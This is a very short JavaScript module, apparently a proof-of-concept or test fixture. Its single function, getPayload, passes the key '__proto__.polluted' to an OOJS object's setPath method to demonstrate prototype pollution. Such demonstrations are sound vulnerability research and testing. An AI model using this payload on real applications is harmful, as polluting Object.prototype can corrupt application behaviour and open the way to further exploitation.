function getPayload(oojs) {
    oojs.setPath({ "__proto__.polluted": "yes" });
}

module.exports = { getPayload };